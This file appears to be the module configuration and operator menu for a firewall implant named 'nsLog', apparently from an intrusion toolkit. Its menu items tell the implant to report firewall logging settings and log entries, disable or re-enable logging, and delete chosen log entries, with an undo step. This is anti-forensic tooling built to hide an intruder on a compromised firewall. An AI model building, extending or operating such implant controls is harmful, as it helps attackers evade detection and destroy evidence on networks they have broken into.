File: BNSLOG-3114.exe
Name: nsLog 
Version: 0x03010104
Priority: 99
ID: 0x90101
#Chain: 0x10000000
Config: initHandler
Activate: activateHandler
Deactivate: deactivateHandler
Install: installHandler
Uninstall: uninstallHandler
Command: getHandler
persistence: stateless
MUNGE
FINAL

<interface>
<menu>

# This asks the implant to return the log settings
  <menuItem>
    <itemText>Get Firewall Logging Settings</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task getsettings</arg>
      </argList>
    </miniProg>
  </menuItem>

# This option disables logging on the firewall
  <menuItem>
    <itemText>Disable Logging</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task disable</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to return the system's boot time 
  <menuItem>
    <itemText>Get System Boot Time</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task time</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to respond with all logs
  <menuItem>
    <itemText>Get All Logs</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task getall</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to respond with one specific log entry
  <menuItem>
    <itemText>Get One Log Entry</itemText>
    <queryList>
      <query>Enter the entry ID to be retrieved (prefix with 'c' for critical logs):</query>
    </queryList>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--entry</arg>
	   <arg>--task getone</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to respond with the n most recent log entries
  <menuItem>
    <itemText>Get n Most Recent Log Entries</itemText>
    <queryList>
      <query>Enter the number to be retrieved:</query>
    </queryList>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--entry</arg>
        <arg>--task getlast</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to retrieve logs >= a severity level
  <menuItem>
    <itemText>Get Logs of a Certain Level</itemText>
    <queryList>
      <query>Enter the log level [e]mer,[a]lert,[c]rit,e[r]ror,[w]arn,[n]otif,[i]nfo,[d]ebug:</query>
      <query>Enter eq, ne, gt, lt, gte, lte:</query>
    </queryList>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--entry</arg>
        <arg>--flag</arg>
        <arg>--task getlevel</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to remove one specific log entry
  <menuItem>
    <itemText>Remove One Log Entry</itemText>
    <queryList>
      <query>Enter the entry ID to be removed (prefix with 'c' for critical logs):</query>
    </queryList>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--entry</arg>
        <arg>--task remove</arg>
      </argList>
    </miniProg>
  </menuItem>

# This asks the implant to restore the last log entry that the operator removed
  <menuItem>
    <itemText>Undo Last Removal</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task undo</arg>
      </argList>
    </miniProg>
  </menuItem>

# This option re-enables logging on the firewall
  <menuItem>
    <itemText>Re-Enable Logging</itemText>
    <miniProg>
      <progName>nsLogMiniProg</progName>
      <handler>getHandler</handler>
      <argList>
        <arg>--task enable</arg>
      </argList>
    </miniProg>
  </menuItem>

</menu>
</interface>
